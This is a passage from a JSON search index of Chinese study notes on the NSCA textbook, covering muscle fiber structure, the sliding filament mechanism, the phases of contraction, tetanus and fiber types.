\u808c\u52a8\u86cb\u767d\u4e1d\u3001\u808c\u7403\u86cb\u767d\u548c\u808c\u8282Z\u7ebf\u6392\u5217\u5f62\u6210\u4e86\u9aa8\u9abc\u808c\u4e0a\u4ea4\u66ff\u51fa\u73b0\u7684\u6df1\u8272\u548c\u6d45\u8272\u7eb9\u6837\uff0c\u653e\u5927\u4e4b\u540e\u5448\u6a2a\u7eb9\u72b6\u3002\u6df1\u8272\u7684A\u5e26\u4e0e\u808c\u7403\u86cb\u767d\u4e1d\u7684\u6392\u5217\u4e00\u81f4\uff0c\u800c\u6d45\u8272\u7684I\u5e26\u5219\u5bf9\u5e94\u7684\u662f2\u6761\u4e34\u8fd1\u808c\u8282\u95f4\u53ea\u5305\u542b\u808c\u52a8\u86cb\u767d\u4e1d\u7684\u90e8\u5206\u3002Z\u7ebf\u4f4d\u4e8eI\u5e26\u4e2d\u592e\uff0c\u662f\u4e00\u6761\u7eb5\u8d2f1\u5e26\u7684\u6df1\u8272\u7ec6\u7ebf\u3002\u808c\u8282\u4e2d\u592e\u7684H\u533a\u53ea\u6709\u808c\u7403\u86cb\u767d\u4e1d\u3002\u5f53\u808c\u8089\u6536\u7f29\u65f6\uff0c\u808c\u52a8\u86cb\u767d\u987a\u7740\u808c\u7403\u86cb\u767d\u6ed1\u5411\u808c\u8282\u4e2d\u592e\uff0c\u8fd9\u65f6H\u533a\u7f29\u77ed\u3002\u5f53Z\u7ebf\u88ab\u62c9\u5411\u808c\u8282\u4e2d\u592e\u65f6\uff0cI\u5e26\u4e5f\u4f1a\u7f29\u77ed\u3002 \u808c\u8d28\u7f51\u662f\u7eb5\u5c0f\u7ba1\u7cfb\u7edf\uff0c\u5b83\u5e73\u884c\u73af\u7ed5\u4e8e\u6bcf\u4e00\u6761\u808c\u539f\u7ea4\u7ef4\uff0c\u5728\u9760\u8fd1Z\u7ebf\u7684\u4f4d\u7f6e\u4f1a\u5f62\u6210\u7ec8\u672b\u6c60\u3002\u9499\u79bb\u5b50\u88ab\u50a8\u5b58\u5728\u8fd9\u4e9b\u7ec8\u672b\u6c60\u4e2d\u3002\u9499\u79bb\u5b50\u7684\u8c03\u8282\u63a7\u5236\u4e86\u808c\u8089\u6536\u7f29\u3002T\u5c0f\u7ba1\u53c8\u79f0\u6a2a\u5c0f\u7ba1\uff0c\u5b83\u7684\u8d70\u5411\u5782\u76f4\u4e8e\u808c\u8d28\u7f51\u5e76\u7ec8\u6b62\u4e8e2\u4e2a\u7ec8\u672b\u6c60\u4e4b\u95f4\u7684Z\u7ebf\u9644\u8fd1\u3002\u56e0\u4e3aT\u5c0f\u7ba1\u5206\u5e03\u5728\u5916\u56f4\u808c\u539f\u7ea4\u7ef4\u4e4b\u95f4\uff0c\u5e76\u5728\u7ec6\u80de\u8868\u9762\u4e0e\u808c\u7ea4\u7ef4\u819c\u5f62\u6210\u8fde\u63a5\uff0c\u56e0\u6b64\uff0c\u52a8\u4f5c\u7535\u4f4d(\u4e00\u79cd\u7535\u795e\u7ecf\u8109\u51b2)\u5728\u91ca\u653e\u65f6\u51e0\u4e4e\u53ef\u4ee5\u540c\u65f6\u62b5\u8fbe\u7ec6\u80de\u8868\u9762\u4e0e\u6df1\u5904\u3002\u9499\u79bb\u5b50\u56e0\u6b64\u5f97\u4ee5\u88ab\u91ca\u653e\u4e8e\u808c\u8089\u4e2d\uff0c\u4ea7\u751f(\u808c\u8089)\u534f\u540c\u6536\u7f29\u3002 \u6765\u81ea\u8fd0\u52a8\u795e\u7ecf\u5143\u7684\u7535\u8109\u51b2(\u52a8\u4f5c\u7535\u4f4d)\u53d1\u51fa\u4fe1\u53f7\uff0c\u9499\u79bb\u5b50\u4ece\u808c\u8d28\u7f51\u91ca\u653e\u5230\u808c\u539f\u7ea4\u7ef4\u4e2d\uff0c\u4f7f\u808c\u8089\u4ea7\u751f\u5f20\u529b\u3002 \u6700\u7b80\u5355\u5730\u6765\u8bb2\uff0c\u808c\u4e1d\u6ed1\u884c\u5b66\u8bf4\u63cf\u8ff0\u4e86\u808c\u8282\u4e24\u7aef\u7684\u808c\u52a8\u86cb\u767d\u4e1d\u5728\u808c\u7403\u86cb\u767d\u4e1d\u4e0a\u5411\u5185\u4fa7\u6ed1\u52a8\uff0c\u5e76\u5c06Z\u7ebf\u5411\u808c\u8282\u4e2d\u592e\u62c9\u52a8\uff0c\u4ece\u800c\u7f29\u77ed\u808c\u7ea4\u7ef4\uff08\u56fe1.7)\u7684\u8fc7\u7a0b\u3002\u5f53\u808c\u52a8\u86cb\u767d\u4e1d\u5728\u808c\u7403\u86cb\u767d\u4e1d\u4e0a\u6ed1\u52a8\u65f6\uff0cH\u533a\u548cI\u5e26\u90fd\u7f29\u77ed\u3002\u808c\u7403\u86cb\u767d\u6a2a\u6865\u6446\u52a8\uff08\u6216\u626d\u52a8\uff09\u5bf9\u808c\u52a8\u86cb\u767d\u4e1d\u7684\u7275\u5f15\u4f5c\u7528\uff0c\u9020\u6210\u4e86\u808c\u52a8\u86cb\u767d\u4e1d\u7684\u6d3b\u52a8\u3002\u7531\u4e8e\u808c\u7403\u86cb\u767d\u6a2a\u6865\u6bcf\u6b21\u6446\u52a8\u53ea\u80fd\u9020\u6210\u808c\u52a8\u86cb\u767d\u4e1d\u7684\u5fae\u5c0f\u4f4d\u79fb\uff0c\u6574\u6761\u808c\u8089\u4e0a\u7684\u8bf8\u591a\u6a2a\u6865\u5fc5\u987b\u5feb\u901f\u3001\u91cd\u590d\u6446\u52a8\uff0c\u624d\u80fd\u9020\u6210\u808c\u52a8\u86cb\u767d\u4e1d\u7684\u660e\u663e\u4f4d\u79fb\u3002","title":"\u808c\u539f\u7ea4\u7ef4\u5185\u90e8\u7ed3\u6784"},{"location":"soft/NSCA/#_9","text":"","title":"\u808c\u8089\u6d3b\u52a8\u7684\u51e0\u79cd\u9636\u6bb5"},{"location":"soft/NSCA/#_10","text":"\u9759\u606f\u9636\u6bb5 \u5728\u6b63\u5e38\u9759\u606f\u65f6\uff0c\u5f88\u5c11\u4f1a\u6709\u9499\u79bb\u5b50\u51fa\u73b0\u5728\u808c\u539f\u7ea4\u7ef4\u4e2d\uff08\u5927\u90e8\u5206\u7684\u9499\u79bb\u5b50\u5b58\u50a8\u5728\u808c\u8d28\u7f51\u4e2d)\uff0c\u56e0\u6b64\u5f88\u5c11\u6709\u808c\u7403\u86cb\u767d\u6a2a\u6865\u4e0e\u808c\u52a8\u86cb\u767d\u8fde\u63a5\u3002\u5373\u4f7f\u808c\u52a8\u86cb\u767d\u4e0a\u7684\u7ed3\u5408\u70b9\u88ab\u906e\u76d6\uff0c\u808c\u52a8\u86cb\u767d\u4e0e\u808c\u7403\u86cb\u767d\u4ecd\u4e0e\u5f7c\u6b64\u4fdd\u6301\u5fae\u5f31\u8fde\u63a5\u3002\u5728\u50a8\u5b58\u7684\u9499\u79bb\u5b50\u88ab\u91ca\u653e\u4e14\u808c\u52a8\u86cb\u767d\u7ed3\u5408\u70b9\u88ab\u66b4\u9732\u540e\uff0c\u8be5\u8fde\u63a5\u4f1a\u53d8\u5f97\u7262\u56fa\uff0c\u808c\u8089\u5f20\u529b\u4e5f\u56e0\u6b64\u4ea7\u751f\u3002","title":"\u9759\u606f\u9636\u6bb5"},{"location":"soft/NSCA/#_11","text":"\u5174\u594b\u4e00\u6536\u7f29\u8026\u8054\u9636\u6bb5 \u808c\u7403\u86cb\u767d\u6a2a\u6865\u6536\u7f29\u4e4b\u524d\uff0c\u5fc5\u987b\u5148\u4e0e\u808c\u52a8\u86cb\u767d\u4e1d\u5f62\u6210\u8fde\u63a5\u3002\u5f53\u808c\u8d28\u7f51\u53d7\u5230\u523a\u6fc0\u800c\u91ca\u653e\u9499\u79bb\u5b50\u65f6\uff0c\u9499\u79bb\u5b50\u4e0e\u808c\u9499\u86cb\u767d\u76f8\u7ed3\u5408\u3002\u808c\u9499\u86cb\u767d\u662f\u4e00\u79cd\u6309\u89c4\u5f8b\u95f4\u9694\u6392\u5217\u5728\u808c\u52a8\u86cb\u767d\u4e1d\u8868\u9762\uff0c\u5e76\u5bf9\u9499\u79bb\u5b50\u5177\u6709\u4eb2\u548c\u529b\u7684\u86cb\u767d\u8d28\u3002\u9499\u79bb\u5b50\u548c\u808c\u9499\u86cb\u767d\u7684\u7ed3\u5408\u4f1a\u5bfc\u81f4\u53e6\u5916\u4e00\u4e2a\u86cb\u767d\u8d28\u5206\u5b50\u4e00\u539f\u808c\u7403\u86cb\u767d\u4ea7\u751f\u4f4d\u79fb\u3002\u539f\u808c\u7403\u86cb\u767d\u6cbf\u7740\u53cc\u87ba\u65cb\u7ed3\u6784\u7684\u808c\u52a8\u86cb\u767d\u4e1d\u6c9f\u69fd\u5206\u5e03\u3002\u6b64\u65f6\u808c\u7403\u86cb\u767d\u6a2a\u6865\u4fbf\u53ef\u4ee5\u66f4\u8fc5\u901f\u5730\u4e0e\u808c\u52a8\u86cb\u767d\u4e1d\u8fde\u63a5\uff0c\u4ece\u800c\u5728\u808c\u52a8\u86cb\u767d\u4e1d\u88ab\u62c9\u5411\u808c\u8282\u4e2d\u592e\u65f6\u4ea7\u751f\u808c\u529b\u3002\u8fd9\u610f\u5473\u7740\uff0c\u4e00\u5757\u808c\u8089\u4ea7\u751f\u7684\u77ac\u65f6\u529b\u91cf\u4e0e\u6b64\u65f6\u808c\u8089\u6a2a\u622a\u9762\u4e2d\u4e0e\u808c\u52a8\u86cb\u767d\u4e1d\u7ed3\u5408\u7684\u6a2a\u6865\u6570\u91cf\u76f4\u63a5\u76f8\u5173\u3002 \u808c\u8089\u4ea7\u751f\u7684\u77ac\u65f6\u529b\u91cf\u53d6\u51b3\u4e8e\u6b64\u65f6\u4e0e\u808c\u52a8\u86cb\u767d\u7ed3\u5408\u7684\u808c\u7403\u86cb\u767d\u6a2a\u6865\u6570\u91cf \u3002","title":"\u5174\u594b\u4e00\u6536\u7f29\u8026\u8054\u9636\u6bb5"},{"location":"soft/NSCA/#_12","text":"\u6536\u7f29\u9636\u6bb5 \u6a2a\u6865\u4f7f\u808c\u52a8\u86cb\u767d\u4e1d\u4ea7\u751f\u62c9\u52a8\u7684\u8fc7\u7a0b\u88ab\u79f0\u4e3a \u52a8\u529b\u51b2\u7a0b \uff0c\u5176\u6240\u9700\u7684\u80fd\u91cf\u6765\u81ea\u4e09\u78f7\u9178\u817a\u82f7\uff08ATP)\u6c34\u89e3\uff08\u5206\u89e3\uff09\u4e3a\u4e8c\u78f7\u9178\u817a\u82f7(ADP)\u548c\u78f7\u9178\u76d0(P)\u7684\u8fc7\u7a0b\u3002\u8fd9\u4e00\u8fc7\u7a0b\u7531\u6a2a\u6865\u4e0a\u7684ATP\u9176\u50ac\u5316\u3002\u4e3a\u4e86\u4f7f\u808c\u7403\u86cb\u767d\u6a2a\u6865\u7684\u7403\u72b6\u5934\u8131\u79bb\u808c\u52a8\u86cb\u767d\u7ed3\u5408\u70b9\u5e76\u56de\u5230\u539f\u6765\u7684\u4f4d\u7f6e\uff0c\u53e6\u4e00\u4e2aATP\u5206\u5b50\u5fc5\u987b\u53d6\u4ee3\u7403\u72b6\u5934\u4e0a\u7684ADP\u3002\u8fd9\u4f7f\u808c\u8089\u5f97\u4ee5\u7ee7\u7eed\u6536\u7f29\uff08\u5982\u679c\u6709\u53ef\u7528\u7684\u9499\u79bb\u5b50\u4e0e\u808c\u9499\u86cb\u767d\u7ed3\u5408)\u6216\u653e\u677e\uff08\u5982\u679c\u6ca1\u6709\u53ef\u7528\u7684\u9499\u79bb\u5b50)\u3002\u503c\u5f97\u6ce8\u610f\u7684\u662f\uff0c\u9499\u79bb\u5b50\u5728\u9aa8\u9abc\u808c\u4e2d\u9664\u4e86\u63a7\u5236\u6536\u7f29\u4ee5\u5916\u8fd8\u5177\u6709\u5176\u4ed6\u91cd\u8981\u4f5c\u7528\uff0c\u5305\u62ec\u65e0\u6c27\u7cd6\u9175\u89e3\u548c\u6709\u6c27\u6c27\u5316\u4ee3\u8c22\uff0c \u4ee5\u53ca\u86cb\u767d\u8d28\u5408\u6210\u548c\u964d\u89e3\u3002","title":"\u6536\u7f29\u9636\u6bb5"},{"location":"soft/NSCA/#_13","text":"\u518d\u84c4\u80fd\u9636\u6bb5 \u53ea\u6709\u5f53\u8fd9\u4e00\u5e8f\u5217\u5728\u6574\u5757\u808c\u8089\u4e2d\u4e0d\u65ad\u91cd\u590d\u53d1\u751f\u65f6\uff0c\u624d\u80fd\u4ea7\u751f\u660e\u663e\u7684\u808c\u8089\u6536\u7f29\uff1a\u9499\u79bb\u5b50\u4e0e\u808c\u9499\u86cb\u767d\u7ed3\u5408\uff1b\u808c\u7403\u86cb\u767d\u6a2a\u6865\u4e0e\u808c\u52a8\u86cb\u767d\u7ed3\u5408\uff1b\u52a8\u529b\u51b2\u7a0b\uff1b\u808c\u7403\u86cb\u767d\u4e0e\u808c\u52a8\u86cb\u767d\u5206\u79bb\uff1b\u808c\u7403\u86cb\u767d\u7403\u72b6\u5934\u590d\u4f4d\u3002\u53ea\u8981\u808c\u539f\u7ea4\u7ef4\u4e2d\u6709\u53ef\u7528\u7684\u9499\u79bb\u5b50\u3001\u6709\u53ef\u4ee5\u5e2e\u52a9\u808c\u7403\u86cb\u767d\u4e0e\u808c\u52a8\u86cb\u767d\u5206\u79bb\u7684ATP\uff0c\u4ee5\u53ca\u8db3\u591f\u591a\u7684\u6d3b\u8dc3\u7684\u808c\u7403\u86cb\u767dATP\u9176\u50ac\u5316ATP\u7684\u5206\u89e3\uff0c\u90a3\u4e48\u8be5\u8fc7\u7a0b\u4fbf\u53ef\u4ee5\u4e0d\u65ad\u5730\u6301\u7eed\u4e0b\u53bb\u3002","title":"\u518d\u84c4\u80fd\u9636\u6bb5"},{"location":"soft/NSCA/#_14","text":"\u653e\u677e\u9636\u6bb5 \u5f53\u6765\u81ea\u8fd0\u52a8\u795e\u7ecf\u5143\u7684\u523a\u6fc0\u505c\u6b62\u65f6\uff0c\u808c\u8089\u4fbf\u4f1a\u653e\u677e\u3002\u9499\u79bb\u5b50\u88ab\u56de\u6536\u5230\u808c\u8d28\u7f51\uff0c \u8fd9\u5c06\u963b\u6b62\u808c\u52a8\u86cb\u767d\u4e1d\u548c\u808c\u7403\u86cb\u767d\u4e1d\u4e4b\u95f4\u5f62\u6210\u8fde\u63a5\u3002\u808c\u52a8\u86cb\u767d\u4e1d\u548c\u808c\u7403\u86cb\u767d\u4e1d\u56de\u5230\u5206\u79bb\u72b6\u6001\u4f7f\u808c\u8089\u653e\u677e\u3002","title":"\u653e\u677e\u9636\u6bb5"},{"location":"soft/NSCA/#_15","text":"\u5f53\u4e00\u4e2a\u8fd0\u52a8\u795e\u7ecf\u5143\u6fc0\u53d1\u8109\u51b2\u4fe1\u53f7\u6216\u52a8\u4f5c\u7535\u4f4d\u65f6\uff0c\u5b83\u6240\u652f\u914d\u7684\u6240\u6709\u808c\u7ea4\u7ef4\u540c\u65f6\u88ab\u6fc0\u6d3b\u5e76\u4ea7\u751f\u529b\u3002\uff08\u795e\u7ecf)\u5bf9\u808c\u8089\u7684\u63a7\u5236\u7a0b\u5ea6\u53d6\u51b3\u4e8e\u6bcf\u4e2a\u8fd0\u52a8\u5355\u4f4d\u5305\u542b\u7684\u808c\u7ea4\u7ef4\u6570\u91cf\u3002\u6709\u4e9b\u5fc5\u987b\u4ee5\u6781\u9ad8\u7cbe\u5ea6\u5de5\u4f5c\u7684\u808c\u8089\uff0c\u4f8b\u5982\u773c\u90e8\u808c\u8089\uff0c\u6bcf\u4e2a\u8fd0\u52a8\u795e\u7ecf\u5143\u6700\u5c11\u53ef\u80fd\u53ea\u63a7\u5236\u4e00\u6761\u808c\u7ea4\u7ef4\u3002\u8fd9\u4e9b\u5c0f\u808c\u8089\u4e2d\u6fc0\u6d3b\u7684\u8fd0\u52a8\u5355\u4f4d\u7684\u6570\u91cf\u7684\u6539\u53d8\uff0c \u53ef\u4ee5\u4ea7\u751f\u4f7f\u773c\u7403\u7cbe\u51c6\u79fb\u52a8\u7684\u529b\u91cf\u3002\u76f8\u6bd4\u4e4b\u4e0b\uff0c \u79fb\u52a8\u817f\u90e8\u7684\u80a1\u56db\u5934\u808c\u5bf9\u7cbe\u5ea6\u7684\u8981\u6c42\u5c31\u4f4e\u5f97\u591a\uff0c \u4e00\u4e2a\u8fd0\u52a8\u795e\u7ecf\u5143\u53ef\u80fd\u652f\u914d\u6570\u767e\u6761\u808c\u7ea4\u7ef4\u3002","title":"\u808c\u8089\u7684\u6fc0\u6d3b"},{"location":"soft/NSCA/#_16","text":"\u6cbf\u8fd0\u52a8\u795e\u7ecf\u5143\u4f20\u5bfc\u7684\u52a8\u4f5c\u7535\u4f4d\uff08\u7535\u6d41\uff09\u4e0d\u80fd\u76f4\u63a5\u6fc0\u6d3b\u808c\u7ea4\u7ef4\uff0c\u800c\u662f\u901a\u8fc7\u5316\u5b66\u4f20\u9012\u65b9\u5f0f\u6765\u6fc0\u6d3b\u88ab\u652f\u914d\u7684\u808c\u7ea4\u7ef4\u3002\u5f53\u52a8\u4f5c\u7535\u4f4d\u4f20\u5230\u8f74\u7a81\u672b\u68a2\u65f6\uff0c\u5f15\u8d77\u795e\u7ecf\u9012\u8d28 \u4e59\u9170\u80c6\u78b1 \u7684\u91ca\u653e\uff0c\u5176\u901a\u8fc7\u6269\u6563\u7a7f\u8fc7\u795e\u7ecf\u808c\u8089\u63a5\u5934\uff0c\u5f15\u8d77\u808c\u7ea4\u7ef4\u819c\u7684\u5174\u594b\u3002\u4e00\u65e6\u91ca\u653e\u7684\u4e59\u9170\u80c6\u78b1\u8fbe\u5230\u9608\u503c\uff0c\u52a8\u4f5c\u7535\u4f4d\u4fbf\u4f1a\u6cbf\u7740\u808c\u7ea4\u7ef4\u819c\u4ea7\u751f\uff0c\u4f7f\u808c\u7ea4\u7ef4\u6536\u7f29\u3002\u540c\u4e00\u8fd0\u52a8\u5355\u4f4d\u4e2d\u7684\u6240\u6709\u808c\u7ea4\u7ef4\u540c\u65f6\u6536\u7f29\u5e76\u4ea7\u751f\u529b\u3002\u6ca1\u6709\u8bc1\u636e\u8868\u660e\u4e00\u4e2a\u8fd0\u52a8\u795e\u7ecf\u5143\u7684\u523a\u6fc0\u53ea\u4f1a\u4f7f\u5176\u63a7\u5236\u7684\u90e8\u5206\u808c\u7ea4\u7ef4\u6536\u7f29\u3002\u540c\u6837\u5730\uff0c\u66f4\u5f3a\u7684\u52a8\u4f5c\u7535\u4f4d\u4e5f\u4e0d\u80fd\u5f15\u8d77\u66f4\u5f3a\u7684\u6536\u7f29\u3002\u8fd9\u79cd\u73b0\u8c61\u88ab\u79f0\u4e3a\u808c\u8089\u6536\u7f29\u7684\u5168\u6216\u65e0\u539f\u5219\u3002","title":"\u5168\u6216\u65e0\u539f\u5219"},{"location":"soft/NSCA/#_17","text":"\u6bcf\u6b21\u8fd0\u52a8\u795e\u7ecf\u5143\u4f20\u5bfc\u7684\u52a8\u4f5c\u7535\u4f4d\u4f1a\u5bfc\u81f4\u8fd0\u52a8\u5355\u4f4d\u5185\u808c\u7ea4\u7ef4\u7684\u77ed\u6682\u6fc0\u6d3b\uff0c\u56e0\u6b64\u800c\u4ea7\u751f\u7684\u77ed\u6682\u6536\u7f29\u88ab\u79f0\u4e3a\u5355\u6536\u7f29\u3002\u808c\u7ea4\u7ef4\u819c\u7684\u6fc0\u6d3b\u5bfc\u81f4\u808c\u7ea4\u7ef4\u5185\u9499\u79bb\u5b50\u7684\u91ca\u653e\uff0c\u5e76\u4e14\u5982\u524d\u6587\u6240\u8ff0\uff0c\u4ea7\u751f\u6536\u7f29\u3002\u5982\u679c\u808c\u52a8\u86cb\u767d\u4e1d\u548c\u808c\u7403\u86cb\u767d\u4e1d\u76f8\u4e92\u7275\u62c9\u6709\u963b\u529b\u5b58\u5728\uff0c\u4fbf\u4f1a\u4ea7\u751f\u529b\u3002\u5c3d\u7ba1\u5728\u4e00\u6b21\u5355\u6536\u7f29\u4e2d\u91ca\u653e\u7684\u9499\u79bb\u5b50\u8db3\u4ee5\u4f7f\u808c\u52a8\u86cb\u767d\u548c\u808c\u7403\u86cb\u767d\u5145\u5206\u6fc0\u6d3b\uff0c\u5e76\u5728\u808c\u7ea4\u7ef4\u4e2d\u4ea7\u751f\u6700\u5927\u529b\uff0c\u4f46\u5728\u808c\u7ea4\u7ef4\u5f20\u529b\u8fbe\u5230\u6700\u5927\u503c\u4e4b\u524d\uff0c \u9499\u79bb\u5b50\u4f1a\u88ab\u6e05\u9664\uff0c\u808c\u8089\u8fdb\u800c\u653e\u677e\uff08\u56fe1.8\u4e2d\u7684\u66f2\u7ebfa)\u3002\u5982\u679c\u5728\u808c\u7ea4\u7ef4\u5b8c\u5168\u653e\u677e\u4e4b\u524d\uff0c\u8fd0\u52a8\u795e\u7ecf\u518d\u6b21\u4f20\u51fa\u523a\u6fc0\uff0c\u5bfc\u81f4\u7b2c\u4e8c\u6b21\u5355\u6536\u7f29\uff0c\u90a3\u4e48\u4e24\u6b21\u5355\u6536\u7f29\u7684\u529b\u4f1a\u53e0\u52a0\uff0c\u5e76\u9020\u6210\u5927\u4e8e\u4e00\u6b21\u5355\u6536\u7f29\u7684\u529b\uff08\u56fe1.8\u4e2d\u7684\u66f2\u7ebfb)\u3002\u51cf\u5c11\u5355\u6536\u7f29\u95f4\u7684\u65f6\u95f4\u95f4\u9694\u4f1a\u9020\u6210\u66f4\u591a\u7684\u6a2a\u6865\u8fde\u63a5\u4e0e\u66f4\u5927\u7684\u529b\u3002\u7535\u8109\u51b2\u523a\u6fc0\u53ef\u4ee5\u4ee5\u6781\u9ad8\u7684\u9891\u7387\u4f20\u5bfc\uff0c \u4f7f\u5355\u6536\u7f29\u5f00\u59cb\u5408\u5e76\u5e76\u4e14\u6700\u7ec8\u5b8c\u5168\u878d\u5408\uff0c\u8be5\u73b0\u8c61\u88ab\u79f0\u4e3a \u5f3a\u76f4 \uff08\u56fe1.8\u4e2d\u7684\u66f2\u7ebfc\u548c\u66f2\u7ebfd) \u8fd9\u662f\u4e00\u4e2a\u8fd0\u52a8\u5355\u4f4d\u4e2d\u6240\u80fd\u4ea7\u751f\u7684\u6700\u5927\u529b\u3002","title":"\u5f3a\u76f4"},{"location":"soft/NSCA/#_18","text":"\u6700\u5e38\u89c1\u7684\u65b9\u6cd5\u662f\u6309\u6536\u7f29\u901f\u5ea6\u5c06\u808c\u7ea4\u7ef4\u5206\u4e3a \u6162\u808c\u7ea4\u7ef4 \u548c \u5feb\u808c\u7ea4\u7ef4 \u3002\u7531\u4e8e\u4e00\u4e2a\u8fd0\u52a8\u5355\u4f4d\u5168\u90e8\u51fa\u540c\u4e00\u79cd\u7c7b\u578b\u7684\u808c\u7ea4\u7ef4\u7ec4\u6210\uff0c\u56e0\u6b64\u8fd0\u52a8\u5355\u4f4d\u4e5f\u53ef\u4f7f\u7528\u8be5\u5206\u7c7b\u6807\u51c6\u6765\u5212\u5206\u3002\u5feb\u808c\u8fd0\u52a8\u5355\u4f4d\u4ea7\u751f\u529b\u548c\u653e\u677e\u90fd\u5f88\u8fc5\u901f\uff0c\u56e0\u6b64\u6536\u7f29\u65f6\u95f4\u77ed\u3002\u76f8\u53cd\uff0c\u6162\u808c\u8fd0\u52a8\u5355\u4f4d\u4ea7\u751f\u529b\u548c\u653e\u677e\u90fd\u8f83\u6162\uff0c\u56e0\u6b64\u6536\u7f29\u65f6\u95f4\u76f8\u5bf9\u8f83\u957f\u3002 \u901a\u5e38\u7528 \u7ec4\u7ec7\u5316\u5b66\u67d3\u8272\u6cd5 \u5c06 \u808c\u7403\u86cb\u767dATP\u9176\u6210\u5206 \u7740\u8272\uff0c\u4ece\u800c\u533a\u5206\u6162\u808c\u7ea4\u7ef4\u548c\u5feb\u808c\u7ea4\u7ef4\u3002 \u867d\u7136\u8fd9\u4e00\u65b9\u6cd5\u53ef\u4ee5\u5bf9\u591a\u79cd\u808c\u7ea4\u7ef4\u67d3\u8272\uff0c\u4f46\u901a\u5e38\u4e3b\u8981\u5206\u4e3a|\u578b\uff08\u6162\u808c\u7ea4\u7ef4\uff09\u3001\u2161a\u578b\uff08\u5feb\u808c\u7ea4\u7ef4\uff09 \u548c\u2161x\u578b\uff08\u5feb\u808c\u7ea4\u7ef4\uff09\u3002\u53e6\u4e00\u4e2a\u66f4\u5177\u4f53\u7684\u65b9\u6cd5\u662f\u786e\u5b9a\u808c\u7403\u86cb\u767d\u91cd\u94fe\u86cb\u767d\u7684\u6570\u91cf\uff1b\u5176\u547d\u540d\u6cd5\u7c7b\u4f3c\u4e8e\u808c\u7403\u86cb\u767dATP\u9176\u7684\u547d\u540d\u65b9\u6cd5\u3002 I\u578b\u808c\u7ea4\u7ef4\u548c\u2161\u578b\u808c\u7ea4\u7ef4\u673a\u7406\u4e0a\u7684\u5dee\u5f02\u9020\u6210\u4e86\u5b83\u4eec\u5728\u6536\u7f29\u65f6\u5bf9\u80fd\u91cf\u7684\u9700\u6c42\u548c\u4f9b\u5e94\uff0c\u4ee5\u53ca\u6297\u75b2\u52b3\u65b9\u9762\u7684\u533a\u522b\u3002","title":"\u808c\u7ea4\u7ef4\u7c7b\u578b"},{"location":"soft/NSCA/#i","text":"I\u578b\u808c\u7ea4\u7ef4\u901a\u5e38\u6548\u7387\u8f83\u9ad8\u4e14\u6297\u75b2\u52b3\uff0c\u540c\u65f6\u6709\u8f83\u9ad8\u7684\u6709\u6c27\u4f9b\u80fd\u80fd\u529b\uff0c\u4f46\u662f\u7531\u4e8e\u5176\u808c\u7403\u86cb\u767dATP\u9176\u6d3b\u6027\u8f83\u4f4e\u548c\u65e0\u6c27\u7206\u53d1\u529b\u5dee\u7684\u7279\u70b9\uff0c\u5feb\u901f\u4ea7\u751f\u808c\u529b\u7684\u80fd\u529b\u6709\u9650\u3002","title":"\u2160\u578b\u808c\u7ea4\u7ef4\u7684\u7279\u70b9"},{"location":"soft/NSCA/#ii","text":"\u2161\u578b\u808c\u7ea4\u7ef4\u5219\u76f8\u53cd\uff0c\u5176\u7279\u70b9\u8868\u73b0\u4e3a\u4f4e\u6548\u7387\u3001\u6613\u75b2\u52b3\u3001\u6709\u6c27\u80fd\u529b\u5dee\u3001\u80fd\u5feb\u901f\u4ea7\u751f\u808c\u529b\u3001\u808c\u7403\u86cb\u767dATP\u9176\u6d3b\u6027\u9ad8\u548c\u65e0\u6c27\u7206\u53d1\u529b\u5f3a\u3002","title":"\u2161\u578b\u808c\u7ea4\u7ef4\u7684\u7279\u70b9"},{"location":"soft/NSCA/#iiaiix","text":"\u2161a\u578b\u808c\u7ea4\u7ef4\u548c\u2161x\u578b\u808c\u7ea4\u7ef4\u7684\u4e3b\u8981\u5dee\u5f02\u5728\u4e8e\u5b83\u4eec\u7684\u6709\u6c27\u6c27\u5316\u80fd\u91cf\u4f9b\u5e94\u80fd\u529b\u3002\u4f8b\u5982\uff0c\u2161a\u578b\u808c\u7ea4\u7ef4\u5177\u6709\u66f4\u5f3a\u7684\u6709\u6c27\u4ee3\u8c22\u80fd\u529b\uff0c\u5e76\u4e14\u56f4\u7ed5\u5b83\u4eec\u7684\u6bdb\u7ec6\u8840\u7ba1\u4e5f\u6bd4\u2161x\u578b\u66f4\u591a\uff0c\u56e0\u6b64\u663e\u793a\u51fa\u66f4\u5f3a\u7684\u6297\u75b2\u52b3\u6027\u3002 \u57fa\u4e8e\u8fd9\u4e9b\u5dee\u5f02\uff0c\u5e76\u4e0d\u96be\u7406\u89e3\uff1a\u7ef4\u6301\u59ff\u6001\u7684\u7a33\u5b9a\u808c\uff0c\u4f8b\u5982\u6bd4\u76ee\u9c7c\u808c\uff0c \u5176I\u578b\u808c\u7ea4\u7ef4\u542b\u91cf\u8f83\u9ad8\uff1b\u800c\u8f83\u5927\u7684\u808c\u8089\uff0c\u53c8\u88ab\u79f0\u4e3a\u8fd0\u52a8\u808c\u8089\uff0c\u4f8b\u5982\u80a1\u56db\u5934\u808c\uff0c\u5219\u662fI\u578b\u808c\u7ea4\u7ef4\u548cI\u578b\u808c\u7ea4\u7ef4\u7684\u6df7\u5408\u4f53\uff0c\u4ee5\u4f7f\u5176\u80fd\u540c\u65f6\u5b8c\u6210\u4f4e\u529f\u7387\u548c\u9ad8\u529f\u7387\u8f93\u51fa\u7684\u6d3b\u52a8\uff08\u4f8b\u5982\u6162\u8dd1\u548c\u51b2\u523a)\u3002\u6709\u5173\u808c\u7ea4\u7ef4\u7c7b\u578b\u7684\u4e3b\u8981\u7279\u6027\u7684\u6982\u8ff0\u89c1\u88681.1\u3002","title":"\u2161a\u578b\u808c\u7ea4\u7ef4\u548c\u2161x\u578b\u808c\u7ea4\u7ef4\u7684\u5dee\u5f02"},{"location":"soft/NSCA/#_19","text":"\u4e00\u5757\u808c\u8089\u53ef\u4ee5\u6839\u636e\u9700\u8981\u5b8c\u6210\u7684\u7279\u5b9a\u4efb\u52a1\u6765\u6539\u53d8\u529b\u91cf\u8f93\u51fa\u7684\u5927\u5c0f\u3002\u8fd9\u79cd\u8c03\u8282\u80fd\u529b\u5bf9\u4e8e\u534f\u8c03\u4e14\u6d41\u7545\u5730\u5b8c\u6210\u52a8\u4f5c\u662f\u81f3\u5173\u91cd\u8981\u7684\u3002","title":"\u8fd0\u52a8\u5355\u4f4d\u52df\u96c6\u6a21\u5f0f"},{"location":"soft/NSCA/#_20","text":"\u808c\u529b\u80fd\u4ee5\u4e24\u79cd\u65b9\u5f0f\u8c03\u8282\u3002\u4e00\u79cd\u662f\u901a\u8fc7\u6539\u53d8\u8fd0\u52a8\u5355\u4f4d\u88ab\u6fc0\u6d3b\u7684\u9891\u7387\u3002\u5982\u679c